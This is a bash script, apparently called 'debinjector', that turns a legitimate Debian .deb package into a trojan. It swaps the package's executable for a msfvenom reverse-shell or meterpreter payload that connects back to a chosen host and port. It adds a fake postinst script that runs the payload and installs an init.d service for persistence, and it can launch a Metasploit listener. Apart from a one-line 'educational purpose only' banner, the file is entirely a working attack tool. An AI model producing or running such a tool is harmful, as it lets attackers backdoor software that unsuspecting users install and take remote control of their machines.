#!/bin/bash

red='\e[31m'
green='\e[32m'
blue='\e[34m'
backred='\e[41m'
end='\e[0m'

echo -e "$red 
     _      _     _        _           _             
  __| | ___| |__ (_)_ __  (_) ___  ___| |_ ___  _ __ 
 / _\` |/ _ \ '_ \| | '_ \ | |/ _ \/ __| __/ _ \| '__|
$end| (_| |  __/ |_) | | | | || |  __/ (__| || (_) | |   
 \__,_|\___|_.__/|_|_| |_|/ |\___|\___|\__\___/|_|   
                        |__/                         

    $green Created by akphyo(4k!ra)
   $end "

if [ $UID -ne 0 ]
then
  echo -e "$backred Run this script with root access!$end"
  exit
fi

exit_fun(){
echo
echo -ne "$green Do you want to exit program?: (y/n) $end" && read con
if [ $con == "y" ] || [ $con == "Y" ]
then
  echo -e "$backred Program is exiting ...$end"
  sleep 1
  exit 0
elif [ $con == "n" ] || [ $con == "N" ]
then
  echo -n 
else
  echo "$backred Wrong input$end"
  sleep 1
  exit_fun
fi
}

trap "exit_fun" 2 15 

PS3=">>"
make_env(){
rm -rf /tmp/wtfinject &> /dev/null 
rm -rf injected_file &> /dev/null
mkdir /tmp/wtfinject
echo -e "$backred For educational purpose only ! $end"
echo -ne "$blue Enter .deb filepath:$end" && read filepath
if [ ! -e $filepath ] && [ ! -f $filepath ] 
then
  echo -e "$red Your selected .deb file does not exist, exiting ... $end"
  sleep 1 && exit 0
fi
echo -ne "$blue Enter Listen Host:$end" && read lhost
echo -ne "$blue Enter Listen Port:$end" && read lport
cp $filepath /tmp/wtfinject/testing.deb
dpkg -x /tmp/wtfinject/testing.deb /tmp/wtfinject/testdir
mkdir /tmp/wtfinject/testdir/DEBIAN
dpkg --info $filepath | grep -A 30 Package > /tmp/wtfinject/testdir/DEBIAN/control
arch_sel
}

arch_sel(){

echo -e "$green Select target OS architecture x86 (or) x64$end"
select architecture in "x86" "x64"
do
  case $architecture in 
    "x86") arch=x86
      break
      ;;
    "x64") arch=x64
      break
      ;;
    *) echo -e "$backred Wrong Input, Exiting !$end"
        sleep 1 && exit 0
      ;;
  esac
done
payload_select
}

payload_select(){
echo -e "$green <-- CHOOSE PAYLOAD --> $end"
select stage in "linux/$arch/shell/reverse_tcp" "linux/$arch/meterpreter/reverse_tcp" "linux/$arch/meterpreter_reverse_tcp" "linux/$arch/shell_reverse_tcp"
do
  case $stage in 
  "linux/$arch/shell/reverse_tcp") payload=$(echo linux/$arch/shell/reverse_tcp) ; msfvenom --arch $arch -p linux/$arch/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $(find /tmp/wtfinject/testdir -type f -executable) 
  break
  ;;
  "linux/$arch/meterpreter/reverse_tcp") payload=$(echo linux/$arch/meterpreter/reverse_tcp) ; msfvenom --arch $arch -p linux/$arch/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $(find /tmp/wtfinject/testdir -type f -executable) 
 break
  ;;
 "linux/$arch/meterpreter_reverse_tcp")  payload=$(echo linux/$arch/meterpreter_reverse_tcp) ; msfvenom --arch $arch -p linux/$arch/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $(find /tmp/wtfinject/testdir -type f -executable)
  break
  ;;
"linux/$arch/shell_reverse_tcp")  payload=$(echo linux/$arch/shell_reverse_tcp) ; msfvenom --arch $arch -p linux/$arch/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $(find /tmp/wtfinject/testdir -type f -executable)
  break
  ;;
  *) echo -e "$backred Wrong Input, Exiting !$end"
      sleep 1 && exit 0
  ;;
  esac
done
persistence
}

persist_file(){
cat << EOF
#!/bin/sh
/$(find /tmp/wtfinject/testdir -type f -executable | cut -d / -f5-)
EOF
}
fake_postinst(){
cat << EOF
#!/bin/sh
sudo chmod 2755 /$(find /tmp/wtfinject/testdir -type f -executable | cut -d / -f5-) && /$(find /tmp/wtfinject/testdir -type f -executable | cut -d / -f5-) &
mv /$(find /tmp/wtfinject/testdir -type f -executable | cut -d / -f5-6)/addon /etc/init.d/
sudo chmod 755 /etc/init.d/addon
sudo update-rc.d addon defaults
EOF
}
 
persistence(){
echo -e "$green Do you want to enable persistence?:$end"
select persist in "yes" "no"
do
  case $persist in
      "yes" ) persist_file > /tmp/wtfinject/testdir/$(find /tmp/wtfinject/testdir -type f -executable | cut -d / -f 5-6)/addon
              break        
  ;;
      "no" ) break
  ;;
  *)  echo -e "$backred Wrong Input, Exiting !$end"
      sleep 1 && exit 0
  ;;
esac
done
fake_postinst > /tmp/wtfinject/testdir/DEBIAN/postinst && chmod 755 /tmp/wtfinject/testdir/DEBIAN/postinst
rebuild
reverse_listener
}

rebuild(){
cd /tmp/wtfinject/testdir/DEBIAN && cat control | grep -B 15 Description | sed 's/ //' | grep -v Depends >> control.bak && cat control | grep -A 15 Description | tail -n +2 | tr -s " " >> control.bak && rm control && mv control.bak control 
if [ $(uname -m) == "x86_64" ] 
then
  if [ $arch == "x86" ] 
  then
    sed -i 's/amd64/i386/g' control &> /dev/null 
  fi
else
  if [ $arch == "x64" ]
  then
    sed -i 's/i386/amd64/g' control &> /dev/null
  fi
fi
dpkg-deb --build /tmp/wtfinject/testdir
cd - &> /dev/null && mkdir injected_file 
mv /tmp/wtfinject/testdir.deb injected_file/injected.deb && chmod 755 injected_file/injected.deb && mv /tmp/wtfinject/testing.deb original.deb
echo -e "$green You injected .deb file successfully! file located in : ./injected_file/injected.deb and original file located in : ./original.deb$end"
}

reverse_listener(){
echo -ne "$red Do you want to start listener? (y/n):$end" && read listen
if [ $listen == "y" ] || [ $listen == "Y" ]
then
  msfconsole -q -x "use exploit/multi/handler ; set payload $payload ; set LHOST $lhost ; set LPORT $lport ; exploit -j "
elif [ $listen == "n" ] || [ $listen == "N" ]
then
  echo -e "$green Good Luck Hackers ...$end"
  sleep 1 && exit 0
else
  echo -e "$red Wrong input...$end"
  sleep 1 && reverse_listener
fi
}

while :
do
make_env
done
